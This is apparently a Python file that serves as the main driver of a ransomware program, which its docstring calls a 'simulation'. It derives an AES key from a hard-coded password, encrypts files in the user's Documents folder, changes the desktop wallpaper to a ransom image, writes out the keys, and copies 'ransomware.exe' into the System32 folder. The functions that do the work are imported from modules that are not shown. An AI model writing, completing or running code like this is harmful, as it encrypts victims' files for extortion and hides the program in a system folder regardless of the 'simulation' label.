from encryption import create_key, encrypt_key, write_key, encrypt_data
from file_operations import get_files, get_documents_path, move_executable, get_parent_folder_path
from system_operations import set_wallpaper, get_system32_path
from Crypto.Cipher import AES

def main():
    """
    Main function to execute the ransomware simulation.
    """
    password = 'infected'
    key = create_key(password)
    encryptkey, privkey = encrypt_key(key)
    cipher = AES.new(key, AES.MODE_CBC)
    
    document_path = get_documents_path()
    system32_path = get_system32_path()
    root_file = get_parent_folder_path()
    
    files = get_files(document_path)
    wallpaper_path = root_file / 'ransomware.png'
    executable_path = root_file / 'ransomware.exe'
    
    set_wallpaper(wallpaper_path)
    encrypt_data(files, cipher)
    write_key(encryptkey, privkey)
    move_executable(executable_path, system32_path)

if __name__ == '__main__':
    main()
